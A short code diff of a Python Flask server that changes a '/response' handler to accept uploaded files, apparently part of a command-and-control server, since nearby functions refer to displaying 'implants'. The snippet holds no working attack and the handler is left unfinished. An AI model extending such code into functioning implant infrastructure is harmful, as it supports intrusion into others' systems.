@@ -212,12 +212,12 @@ def display_implants():
 @app.route("/response", methods=["POST"]) 
 def handle_response():
     try: 
-        data = request.get_data()
+        file = request.files['file']
         
-    
-    except Exception as e:
-        print (f"Error displaying implants: {e}")
-        return e, {'Access-Control-Allow-Origin': config.clientURL}
+
+    except Exception as error:
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
 
 # for testing
 # def main():
